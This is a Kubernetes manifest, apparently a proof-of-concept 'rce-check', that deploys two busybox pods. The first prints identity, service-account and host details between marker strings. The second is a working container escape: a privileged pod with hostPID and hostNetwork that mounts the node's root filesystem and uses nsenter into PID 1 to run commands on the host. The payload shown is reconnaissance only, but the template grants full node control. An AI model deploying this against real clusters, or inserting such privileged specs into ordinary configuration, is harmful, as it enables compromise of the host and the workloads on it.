apiVersion: v1
kind: Namespace
metadata:
  name: rce-check-37055
---
apiVersion: v1
kind: Pod
metadata:
  name: rce-check
  namespace: rce-check-37055
  labels:
    app: rce-check-37055
spec:
  restartPolicy: Never
  containers:
    - name: c
      image: busybox:1.36
      command: ["/bin/sh", "-c"]
      args:
        - |
          echo "RCE_MARKER_37055_START"
          echo "whoami: $(id)"
          echo "hostname: $(hostname)"
          echo "uname: $(uname -a)"
          echo "sa_ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
          echo "k8s_host: $KUBERNETES_SERVICE_HOST"
          cat /etc/os-release 2>/dev/null | head -3
          echo "RCE_MARKER_37055_END"
          sleep 900
---
apiVersion: v1
kind: Pod
metadata:
  name: rce-check-node
  namespace: rce-check-37055
  labels:
    app: rce-check-37055
spec:
  restartPolicy: Never
  hostPID: true
  hostNetwork: true
  containers:
    - name: c
      image: busybox:1.36
      securityContext:
        privileged: true
      command: ["/bin/sh", "-c"]
      args:
        - |
          echo "NODE_RCE_MARKER_37055_START"
          echo "host_hostname_file: $(cat /host/etc/hostname 2>/dev/null)"
          echo "host_os: $(cat /host/etc/os-release 2>/dev/null | head -2 | tr '\n' ' ')"
          echo "nsenter_host:"
          nsenter --target 1 --mount --uts --ipc --net --pid -- sh -c 'id; hostname; uname -a; cat /etc/hostname' 2>&1 || echo "nsenter_failed"
          echo "NODE_RCE_MARKER_37055_END"
          sleep 900
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
        type: Directory
